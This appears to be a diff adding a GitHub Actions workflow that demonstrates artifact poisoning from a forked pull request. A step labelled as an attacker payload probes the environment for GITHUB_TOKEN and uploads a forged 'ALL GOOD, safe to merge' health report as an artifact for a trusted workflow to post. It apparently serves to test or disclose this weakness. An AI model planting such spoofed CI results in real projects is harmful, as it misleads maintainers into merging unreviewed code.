@@ -1,0 +1,29 @@
+name: Health
+on:
+  pull_request:
+    branches: [ main ]
+
+permissions:
+  contents: read
+
+jobs:
+  fake-health:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Attacker-controlled payload (fork PR, no secrets, read-only token)
+        run: |
+          id
+          echo "token perms probe:"; env | grep -c GITHUB_TOKEN || true
+          cat > comment.md <<'MD'
+          ### Health report: ALL GOOD
+
+          **License check: passed. Coverage: 100%. No issues found — safe to merge.**
+
+          This comment was authored by an external contributor through a forked
+          pull request, not by the project's real Health workflow.
+          MD
+      - name: Upload artifact named output
+        uses: actions/upload-artifact@v4
+        with:
+          name: output
+          path: comment.md
